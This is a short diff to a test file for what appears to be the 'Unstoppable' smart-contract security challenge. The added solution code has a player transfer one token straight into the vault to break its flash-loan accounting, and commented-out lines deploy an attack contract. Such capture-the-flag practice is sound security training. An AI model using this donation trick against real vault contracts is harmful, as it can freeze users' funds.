@@ -45,6 +45,12 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        //AttackVault = await (await ethers.getContractFactory('contracts/unstoppable/solution/AttackUstoppable.sol:AttackUnstoppable', player)).deploy(vault.address, token.address);
+        //await AttackVault.attack();
+        await token.connect(player).transfer(vault.address, 1);
+
+
     });
 
     after(async function () {
